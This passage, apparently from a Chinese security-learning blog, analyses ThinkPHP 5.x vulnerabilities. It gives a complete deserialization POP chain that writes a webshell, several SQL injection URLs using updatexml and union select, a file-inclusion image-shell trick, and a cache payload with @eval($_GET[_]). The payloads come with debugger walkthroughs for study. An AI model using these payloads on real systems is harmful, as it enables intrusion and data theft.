think\\db;\nuse think\\console\\Output;\nclass Query\n{\n    protected $model;\n    public function __construct(){\n        $this->model=new Output();\n    }\n}\n```\n\n接着查看Output类的__call方法，这里的 `$method` 参数就是 `getAttr` ， `$args` 是Model类中 `$bindAttr` 变量。也就是上面exp所写的 `[studentYang]` ，接着检查 `$this->styles` 数组中是否存在变量 `$method` 的值，而 `$this->styles` 是可控的，因此假设能够成功进入该循环，接着 `array_unshift($args, $method)` 将变量 `$method` 插入到数组 `$args` 的开头，那 `$args` 就变成了 `[getAttr,studentYang]` ，然后调用block方法，将args参数传递到该方法\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240314143405626.png\" alt=\"image-20240314143405626\" style=\"zoom: 33%;\" />\n\n如下所示，block方法会写入后面的messages，后面的messages通过前面的变量传递应该是 `<getAttr>studentYang</getAttr>`\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240314144119613.png\" alt=\"image-20240314144119613\" style=\"zoom:50%;\" />\n\n然后查看writeln方法，这里的 `$messages` 就是 `<getAttr>studentYang</getAttr>` \n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240314144248606.png\" alt=\"image-20240314144248606\" style=\"zoom: 50%;\" />\n\ntype应该为0\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240314144340666.png\" alt=\"image-20240314144340666\" style=\"zoom: 50%;\" />\n\n接着调用了handle类指定的write方法，这里的参数： `$messages` 是 `<getAttr>studentYang</getAttr>` ， `$newline` 是true， `$type` 是0，而 `$this->handle` 是可控的，这里选择Memcache.php中的`write`方法，位于 `thinkphp/library/think/session/driver/Memcache.php`\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240314144408286.png\" alt=\"image-20240314144408286\" style=\"zoom:50%;\" />\n\n由此的exp应该增加如下\n\n```php\nnamespace think\\console;\nuse think\\session\\driver\\Memcache;\nclass Output\n{\n    protected $styles=[];\n    private $handle=null;\n    public function __construct(){\n        $this->styles = ['getAttr'];\n        $this->handle=new Memcache();\n    }\n}\n```\n\n接着查看Memcache类的write方法，这里的 `$sessId` 应该就是 `$messages` 的内容，`$sessData` 就是 `$newline` 的内容，这里的 `$this->handle` 是可控的，因此需要查找set函数有漏洞的类，这里选择了File.php的`set`方法进行利用，位于 `thinkphp/library/think/cache/driver/File.php`\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240314145141084.png\" alt=\"image-20240314145141084\" style=\"zoom: 40%;\" />\n\n至此exp增加以下内容\n\n```php\nnamespace think\\session\\driver;\nuse think\\cache\\driver\\File;\nclass Memcache\n{\n    protected $handler=null;\n    public function __construct(){\n        $this->handler=new File();\n    }\n}\n```\n\n如下所示，这里有file_put_contents方法，说不定有漏洞\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240314145523493.png\" alt=\"image-20240314145523493\" style=\"zoom: 40%;\" />\n\n一步步进行分析，首先确定传入的变量是什么， `$name` 是  `<getAttr>studentYang</getAttr>` ，`$value` 是true，而后面的内容中filename和name相关，而data只和value相关，因此此处的file_put_contents函数不好利用，但是下面的setTagItem函数可利用，该函数位于driver类\n\n这里的 `$name` 是变量 `$filename` ，这里的 `this->tag ` 是可控的，想办法让value等于name就可以成功执行我们的文件生成函数了\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240314150247399.png\" alt=\"image-20240314150247399\" style=\"zoom: 40%;\" />\n\n现在分析filename会变成什么，在set函数中，主要进行了以下操作\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240314150723238.png\" alt=\"image-20240314150723238\" style=\"zoom:50%;\" />\n\n而这个函数如下，这里的 `this->options` 也是可控的，我们想办法不对name进行额外修改，让返回的`$filename = $this->options['path'] . $name . '.php';`，故`$filename`前部分内容可控，最后返回的filename就是 `path+md5(name)+.php`\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240314150749846.png\" alt=\"image-20240314150749846\" style=\"zoom:40%;\" />\n\n接着在setTagItem函数中，让最后的set方法指向File.php的set方法\n\n最后增加的exp如下\n\n```php\nnamespace think\\cache\\driver;\nclass File\n{\n    protected $tag;\n    protected $options=[];\n    public function __construct(){\n        $this->tag=true;\n        $this->options = [\n            'expire'        => 0,\n            'cache_subdir'  => false,\n            'prefix'        => '',\n            'path'          => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgZWNobyBzaGVsbF9leGVjKCJjYWxjIik7Pz4=/../a.php',  //功能：弹出计算器\n            'data_compress' => false,\n        ];\n    }\n}\n\nuse think\\process\\pipes\\Windows;\n$windows = new Windows();\necho urlencode(serialize($windows));\n```\n\n其中，path的构造原理如下\n\n```php\n$code = '<?php echo shell_exec(\"calc\");?>';\n$data=base64_encode($code);\necho $data;\n```\n\n综上所述，整条链子逻辑如下\n\n```\nWindows类的__destruct()-->removeFiles()-->Model类的__tostring()-->toJson()-->toArray()-->Output类的__call()-->block()-->writeln()-->write()-->Memcache类的write()-->File类的set()-->Driver类的setTagItem()-->File类的set()-->file_put_contents写入shell\n```\n\n最后执行效果如图所示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A05/image-20240315142812185.png\" alt=\"image-20240315142812185\" style=\"zoom: 25%;\" />\n","tags":["php"],"categories":["安全"]},{"title":"Thinkphp5_x（不包含反序列化）","url":"/post/96d74354.html","content":"\n#### Thinkphp5_x（不包含反序列化）\n\n参考链接：https://github.com/lu2ker/PHP-Code\n\n<!--more-->\n\n##### 可能被利用的函数\n\n###### array_search()\n\n```php\narray_search ( mixed $needle , array $haystack , bool $strict=false ) # 在数组中搜索给定值，如果成功则返回第一个对应的键。\n```\n\n 如果第三个参数没有主动设置为true(默认为false)，则有绕过的可能性。\n\n如果为false则进行弱比较匹配（不比较类型），意味着 PHP 会在进行比较时进行弱类型转换。在某些情况下，这种类型转换可能会导致意外的结果，从而引发漏洞。\n\n例如，在某些情况下，`array_search()` 可能会在搜索字符串时将字符串与数字进行比较。如果字符串的内容可以被解释为数字，则 PHP 将尝试将其转换为数字，并将其视为相等。这种行为可能被恶意利用，导致安全漏洞。\n\n###### in_array()\n\n```php\n in_array ( mixed $needle , array $haystack , bool $strict = false ) : bool  #检查数组中是否存在某个值\n```\n\n当in_array()函数的第三个参数未设置为true时（默认为false），会进行弱比较，可能会引发漏洞\n\n###### filter_var()\n\n```php\nfilter_var( mixed $value, int $filter = FILTER_DEFAULT, array|int $options = 0) : mixed # 使用特定的过滤器过滤一个变量。\n```\n\n`FILTER_VALIDATE_URL` 过滤器把`$value`作为 URL 来验证，验证其是否是URL格式的字符串，但是有一个很大的问题是 这个过滤器的”宽容性很高“，类似于`qwe://`这种形式的URL都可以通过它的过滤。\n\n经过一些测试发现，形如`xxx://xxx`即可验证通过该过滤器。但是如果前半部分是`http://`的话，正斜杠后边不允许有特殊字符了。比如`http://><\"\";''`是不行的但是`qwe://><\"\";''`确实可以通过过滤的。\n\n###### class_exists()\n\n```php\nclass_exists ( string $class , bool $autoload = true ) : bool # 检查指定的类是否已定义。$autoload是是否默认调用__autoload函数。\n```\n\n自动包含漏洞，可以使用`../`路径穿越来实现任意文件包含。但是，只有在**PHP5~5.3（含）中才可以在`class_exists()`中传入`../`达到目的，高版本php中向`class_exists`中传入`../`是不会调用**`__autoload()`的。\n\n###### strpos()\n\n```php\nstrpos ( string $haystack , mixed $needle , int $offset = 0 ) : int # 返回 needle 在 haystack 中首次出现的数字位置。如果提供了$offset，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。\n```\n\n返回的是int而不是bool，因此如果数字位置是0则效果和false一样\n\n###### escapeshellarg()和escapeshellcmd()\n\n...\n\n#### 下载安装\n\n###### composer安装\n\n```shell\ncurl -sS https://getcomposer.org/installer | php\nmv composer.phar /usr/local/bin/composer\ncomposer config -g repo.packagist composer https://mirrors.aliyun.com/composer/  \n```\n\n##### sql1\n\n###### 环境\n\nthinkphp5.0.15下载\n\n```shell\ncomposer create-project topthink/think=5.0.15 tp5\n```\n\n修改composer.json文件\n\n```json\n\"require\": {\n    \"php\": \">=5.4.0\",\n    \"topthink/framework\": \"5.0.15\"\n}\n```\n\n同目录下执行`composer update`\n\n###### 测试代码\n\n```php\n<?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n    public function index()\n    {\n        $username = request()->get('username/a');\n        db('users')->insert(['username' => $username]);\n        return 'Update success';\n    }\n}\n```\n\npayload：\n\n```url\n~/public/index.php/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,database(),0x7e),1)&username[2]=1\n```\n\n###### 代码分析\n\n从代码本身上应该是获取username参数然后插入到数据库中，最后返回更新成功结果\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304140856119.png\" alt=\"image-20240304140856119\" style=\"zoom:33%;\" />\n\n先随便传入一个参数分析代码执行过程\n\n首先是调用get方法，如果this->get参数为空就将获取到的get参数传递给this->get，然后判断name是否为数组，这里的name不是数组，会进入到下面的input函数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304141537693.png\" alt=\"image-20240304141537693\" style=\"zoom:33%;\" />\n\n在该函数中，将username按照了/进行分割，name为username，type为a\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304141630796.png\" alt=\"image-20240304141630796\" style=\"zoom:33%;\" />\n\n在下面代码中进行了类型检查和强制数组类型转换，各type含义如下：<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20210831142915046.png\" alt=\"image-20210831142915046\" style=\"zoom: 25%;\" />\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304141851612.png\" alt=\"image-20240304141851612\" style=\"zoom:50%;\" />\n\n由此返回的username参数就是get获取到的参数的数组形式\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304142040564.png\" alt=\"image-20240304142040564\" style=\"zoom:33%;\" />\n\n然后进入数据库的插入函数，data进行了合并数组，结果还是之前的[username:[\"hello\"]]，这里我发现返回的sql结果是0，进入该函数分析\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304142457991.png\" alt=\"image-20240304142457991\" style=\"zoom:33%;\" />\n\n查看这里的insert函数，首先进行了解析数据，这里data就直接返回空了，查看该函数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304142712277.png\" alt=\"image-20240304142712277\" style=\"zoom:33%;\" />\n\n这里的val就是data转换为list形式，没有键，即[\"hello\"]，因此此处的比较无法通过，最后返回的就是空\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304142959506.png\" alt=\"image-20240304142959506\" style=\"zoom:33%;\" />\n\n因此重新传入危险参数，再次调试到该步\n\n```url\nusername[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1\n```\n\n此时的val就是长度为3的数组，第二个参数是很常见的报错注入\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304143310307.png\" alt=\"image-20240304143310307\" style=\"zoom: 50%;\" />\n\n传递后的结果如图所示，主要是此处的**parseKey没有对变量值进行有效过滤**\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304143438165.png\" alt=\"image-20240304143438165\" style=\"zoom: 25%;\" />\n\n最后返回的结果相当于把username作为的是列名字，后面的参数是要插入的值，最后返回的sql语句如下\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304143624757.png\" alt=\"image-20240304143624757\" style=\"zoom: 25%;\" />\n\n因此引发报错注入，会显示用户\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304143930652.png\" alt=\"image-20240304143930652\" style=\"zoom:50%;\" />\n\n##### sql2\n\n###### 环境\n\nthinkphp5.0.15下载\n\n```shell\ncomposer create-project --prefer-dist topthink/think=5.1.0 tpdemo\n```\n\n修改composer.json文件\n\n```json\n\"require\": {\n    \"php\": \">=5.6.0\",\n    \"topthink/framework\": \"5.1.7\"\n}\n```\n\n同目录下执行`composer update`\n\n###### 测试代码\n\n```php\n<?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n    public function index()\n    {\n        $username = request()->get('username/a');\n        db('users')->where(['id' => 1])->update(['username' => $username]);\n        // db('users')->insert(['username' => $username]);  上一份测试代码\n        return 'Update success';\n    }\n}\n```\n\npayload\n\n```url\n~/public/?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0\n```\n\n\n\n###### 代码分析\n\n通过观察可以看到前面获取username方法是一样的，主要分析此处的where函数，但从该语句的格式应该是更新id为1处的username为获取到的参数\n\n用payload进行调试，可以看到此时的this就是传入的参数的内容\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304164237002.png\" alt=\"image-20240304164237002\" style=\"zoom: 25%;\" />\n\n\n\n那sql代码的执行应该就是在下面的update函数里面，通过查看该函数内容，可以看到sql语句生成过程\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304164459903.png\" alt=\"image-20240304164459903\" style=\"zoom:33%;\" />\n\n在此处的parsedata应该就是对传入的username进行过滤清洗转换为可用形式\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304164641551.png\" alt=\"image-20240304164641551\" style=\"zoom:33%;\" />\n\n在parseData函数里面的parseArrayData就是清洗的具体函数，用于解析数组形式的数据并返回相应的数据库查询语句片段，首先获取data的第一二个参数给type和value，fun是第三个参数，point是第四个参数，然后进行重新组合，会生成类似于 `'GeomFromText('POINT(x y)')'` 的字符串。而该函数本身的用意是将坐标 `(x, y)` 转换成几何点的 MySQL 函数调用，在此处我们通过构造poc替代这里的函数，使得最后生成的函数是我们的报错注入的内容\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304164943983.png\" alt=\"image-20240304164943983\" style=\"zoom:25%;\" />\n\n生成result之后后面就会拼接成sql语句，然后执行，最后实现报错注入\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304165616979.png\" alt=\"image-20240304165616979\" style=\"zoom: 25%;\" />\n\n##### sql3\n\n###### 环境\n\nthinkphp5.0.10下载\n\n```shell\ncomposer create-project --prefer-dist topthink/think=5.0.10 tpdemo\n```\n\n修改composer.json文件\n\n```json\n\"require\": {\n    \"php\": \">=5.4.0\",\n    \"topthink/framework\": \"5.0.10\"\n},\n```\n\n同目录下执行`composer update`\n\n###### 测试代码\n\n```php\n<?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n    public function index()\n    {\n        $username = request()->get('username');\n        $result = db('users')->where('username','exp',$username)->select();\n        // $username = request()->get('username/a');\n        // db('users')->where(['id' => 1])->update(['username' => $username]);  上一份代码\n        return 'select success';\n    }\n}\n```\n\npayload\n\n```url\n~/public/index.php?username==updatexml(1,concat(0x7,database(),0x7e),1)\n```\n\n\n\n###### 代码分析\n\n首先看到此处已经不是username/a，说明可能强制数组类型转换，先随便传入参数进行调试分析，有此处看到由于前面传入的没有/a，所以此处type会被设置为s，s是强制转换为字符串类型\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304171009653.png\" alt=\"image-20240304171009653\" style=\"zoom:33%;\" />\n\n下面返回之前进行强制字符串类型转换，该处的data就是返回的username\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304171137773.png\" alt=\"image-20240304171137773\" style=\"zoom:33%;\" />\n\n接着分析第二段代码\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304171300752.png\" alt=\"image-20240304171300752\" style=\"zoom:33%;\" />\n\n这是前面流程基本一致，这是生成的sql函数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304171700471.png\" alt=\"image-20240304171700471\" style=\"zoom:33%;\" />\n\n此处就是单纯对sql语句进行了拼接，应该没有检查，通过添加等号就可以看到可以成功执行了\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304172025040.png\" alt=\"image-20240304172025040\" style=\"zoom:33%;\" />\n\n因此还是可以通过报错注入做\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304172147665.png\" alt=\"image-20240304172147665\" style=\"zoom:33%;\" />\n\n##### sql4\n\n###### 环境\n\nthinkphp5.0.10下载\n\n```shell\ncomposer create-project --prefer-dist topthink/think=5.0.10 tpdemo\n```\n\n修改composer.json文件\n\n```json\n\"require\": {\n    \"php\": \">=5.4.0\",\n    \"topthink/framework\": \"5.0.10\"\n},\n```\n\n同目录下执行`composer update`\n\n###### 测试代码\n\n```php\n<?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n    public function index()\n    {\n        $username = request()->get('username/a');\n        $result = db('users')->where(['username' => $username])->select();\n        var_dump($result);\n        // $username = request()->get('username');\n        // $result = db('users')->where('username','exp',$username)->select();\n    }\n}\n```\n\npayload\n\n```url\n~/public/index.php?username[0]=not%20like&username[1][0]=%%&username[1][1]=233&username[2]=)%20union%20select%201,user()%23\n```\n\n\n\n###### 代码分析\n\n直接根据payload调试代码理解代码执行过程\n\n$username还是数组形式，直接分析result代码，代码执行过程就是db->where->select，前面两个和传入的参数关系不大，这里直接分析select函数，跳转到此处的sql之前我们传入的参数并没有被使用，这里的options包含了我们传入的参数的内容\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304202814176.png\" alt=\"image-20240304202814176\" style=\"zoom: 25%;\" />\n\n在select函数中主要是通过获取各参数值进行sql语句的生成，我们主要关注和payload有关的where\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304203016264.png\" alt=\"image-20240304203016264\" style=\"zoom:25%;\" />\n\n如下所示，先进入buildwhere函数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304203328509.png\" alt=\"image-20240304203328509\" style=\"zoom:25%;\" />\n\n最后返回的wherestr和此处的str有关，继续查看相关函数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304203447389.png\" alt=\"image-20240304203447389\" style=\"zoom:33%;\" />\n\n在此处将第一个和第二个参数分别赋值给了exp和value\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304203531585.png\" alt=\"image-20240304203531585\" style=\"zoom:33%;\" />\n\n后面会检查value是否为标量，如果是就会重新对value赋值，而我们此处的value是数组，还有后面对exp的过滤，发现少了not like\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304203711608.png\" alt=\"image-20240304203711608\" style=\"zoom:25%;\" />\n\n接着进行模糊匹配\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304203820209.png\" alt=\"image-20240304203820209\" style=\"zoom:33%;\" />\n\n生成以下内容\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304204019513.png\" alt=\"image-20240304204019513\" style=\"zoom:25%;\" />\n\n最后的wherestr如图所示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304204410583.png\" alt=\"image-20240304204410583\" style=\"zoom:25%;\" />\n\n最后构造出的sql语句\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304204538559.png\" alt=\"image-20240304204538559\" style=\"zoom: 50%;\" />\n\n最终执行效果\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304204944556.png\" alt=\"image-20240304204944556\" style=\"zoom:33%;\" />\n\n##### sql5\n\n###### 环境\n\nthinkphp5.1.22下载\n\n```shell\ncomposer create-project --prefer-dist topthink/think=5.1.22 tpdemo\n```\n\n修改composer.json文件\n\n```json\n\"require\": {\n    \"php\": \">=5.6.0\",\n    \"topthink/framework\": \"5.1.22\"\n},\n```\n\n同目录下执行`composer update`\n\n###### 测试代码\n\n```php\n<?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n    public function index()\n    {\n        $orderby = request()->get('orderby');\n        $result = db('users')->where(['username' => 'mochazz'])->order($orderby)->find();\n        var_dump($result);\n    }\n}\n```\n\npayload\n\n```url\n~/public/index.php?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1\n```\n\n###### 代码分析\n\n在本项目中传入的是orderby参数，并且是通过数组赋值的方式进行传递的，通过get方法理解orderby参数获取\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304211101722.png\" alt=\"image-20240304211101722\" style=\"zoom:33%;\" />\n\n传递进的orderby如图所示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304211201542.png\" alt=\"image-20240304211201542\" style=\"zoom: 50%;\" />\n\n通过getdata变成字符串数组\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304211338857.png\" alt=\"image-20240304211338857\" style=\"zoom:33%;\" />\n\n最后返回给orderby参数的值为\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304211444960.png\" alt=\"image-20240304211444960\" style=\"zoom: 25%;\" />\n\n现在进入下面sql执行过程，在order函数中将传入的orderby参数给了order\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304211737867.png\" alt=\"image-20240304211737867\" style=\"zoom: 25%;\" />\n\n然后将options传递给connection的find方法\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304211843131.png\" alt=\"image-20240304211843131\" style=\"zoom: 50%;\" />\n\n如下是根据payload生成的order参数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304212627585.png\" alt=\"image-20240304212627585\" style=\"zoom:25%;\" />\n\n生成的sql语句为\n\n```sql\nSELECT * FROM `users` WHERE  `username` = :where_AND_username ORDER BY `id`|updatexml(1,concat(0x7,user(),0x7e),1)#` LIMIT 1  \n```\n\n最终效果\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304212908802.png\" alt=\"image-20240304212908802\" style=\"zoom:33%;\" />\n\n##### sql6\n\n###### 环境\n\n沿用上文环境\n\n###### 测试代码\n\n```php\n<?php\nnamespace app\\index\\controller;\n\nclass Index\n{\n    public function index()\n    {\n        $options = request()->get('options');\n        $result = db('users')->max($options);\n        var_dump($result);\n    }\n}\n```\n\npayload\n\n```url\n~/public/index.php?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1)%20from%20users%23\n```\n\n###### 代码分析\n\n第一行代码还是一样，直接看获取到的options参数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304214040554.png\" alt=\"image-20240304214040554\" style=\"zoom:33%;\" />\n\n进入max函数查看代码执行流程，max函数中只调用了aggregate方法，而aggregate方法中又调用了connection的aggregate方法\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304214344276.png\" alt=\"image-20240304214344276\" style=\"zoom: 33%;\" />\n\n在该函数中重新构造了field\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304214510340.png\" alt=\"image-20240304214510340\" style=\"zoom:33%;\" />\n\n接着进入value函数，value函数中的该部分会将field转换为字符串数组形式\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304214751014.png\" alt=\"image-20240304214751014\" style=\"zoom:33%;\" />\n\n接着设置query的参数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304215043886.png\" alt=\"image-20240304215043886\" style=\"zoom: 50%;\" />\n\n最后的sql语句就是构造的field\n\n```sql\nSELECT MAX(`id`)+updatexml(1,concat(0x7,user(),0x7e),1) from users#`) AS tp_max FROM `users` LIMIT 1  \n```\n\n效果如图所示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240304215326838.png\" alt=\"image-20240304215326838\" style=\"zoom: 33%;\" />\n\n##### 文件包含7\n\n###### 环境\n\nthinkphp5.0.18下载\n\n```shell\ncomposer create-project --prefer-dist topthink/think=5.0.18 tpdemo\n```\n\n修改composer.json文件\n\n```json\n\"require\": {\n    \"php\": \">=5.6.0\",\n    \"topthink/framework\": \"5.0.18\"\n},\n```\n\n同目录下执行`composer update`\n\n###### 测试代码\n\n```php\n<?php\nnamespace app\\index\\controller;\nuse think\\Controller;\nclass Index extends Controller\n{\n    public function index()\n    {\n        $this->assign(request()->get());\n        return $this->fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html\n    }\n}\n```\n\n创建 **application/index/view/index/index.html** 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马 **1.jpg** 放至 **public** 目录下（模拟上传图片操作）。接着访问`~/public/index.php?cacheFile=1.jpg` 链接，即可触发 **文件包含漏洞** 。\n\npayload\n\n```url\n~/public/index.php?cacheFile=1.jpg\n```\n\n###### 代码分析\n\n首先通过request()->get()获取get参数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305102443428.png\" alt=\"image-20240305102443428\" style=\"zoom:33%;\" />\n\n接着调用input方法进行过滤或者类型转换，此处没有类型转换，最后返回的data就是传递进来的值\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305102552087.png\" alt=\"image-20240305102552087\" style=\"zoom:33%;\" />\n\n接着进入assign函数，在该函数中直接调用了view的assign函数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305102629136.png\" alt=\"image-20240305102629136\" style=\"zoom:50%;\" />\n\n现在进入view的assign函数，这里直接将name给了this->data，没有过滤\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305102704571.png\" alt=\"image-20240305102704571\" style=\"zoom:33%;\" />\n\n最后回到主函数，由此，第一行代码的主要用处就是将get参数赋值给this->data，接着进入fetch函数，同样也是直接调用的view的fetch函数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305102840977.png\" alt=\"image-20240305102840977\" style=\"zoom:50%;\" />\n\n首先将文件名赋值给var\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305102926018.png\" alt=\"image-20240305102926018\" style=\"zoom:50%;\" />\n\n在此处有对vars变量的利用\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305103222701.png\" alt=\"image-20240305103222701\" style=\"zoom:50%;\" />\n\n在该函数中首先进行模板文件调取，成功就进入下面的template的fetch函数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305103336582.png\" alt=\"image-20240305103336582\" style=\"zoom: 33%;\" />\n\n在template的fetch函数中，将data值赋值给了this->data变量，下面主要关注对该变量的使用，如下所示，进入了read函数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305103540991.png\" alt=\"image-20240305103540991\" style=\"zoom: 33%;\" />\n\n在此处调用了extract函数，经过调试测试发现在运行该函数之后cachefile的值就会变成vars的值，应该是extract会将缓存变量覆盖成vars变量的值，最终导致cacheFile的改变\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305103622178.png\" alt=\"image-20240305103622178\" style=\"zoom:33%;\" />\n\n效果呈现\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305104145722.png\" alt=\"image-20240305104145722\" style=\"zoom:33%;\" />\n\n##### 代码执行8\n\n###### 环境\n\nthinkphp5.0.10下载\n\n```shell\ncomposer create-project --prefer-dist topthink/think=5.0.10 tpdemo\n```\n\n修改composer.json文件\n\n```json\n\"require\": {\n    \"php\": \">=5.4.0\",\n    \"topthink/framework\": \"5.0.10\"\n},\n```\n\n同目录下执行`composer update`\n\n###### 测试代码\n\n```php\n<?php\nnamespace app\\index\\controller;\nuse think\\Cache;\nclass Index\n{\n    public function index()\n    {\n        Cache::set(\"name\",input(\"get.username\"));\n        return 'Cache success';\n    }\n}\n```\n\npayload\n\n```php\n~/public/index.php?username=mochazz123%0d%0a@eval($_GET[_]);//\n```\n\n###### 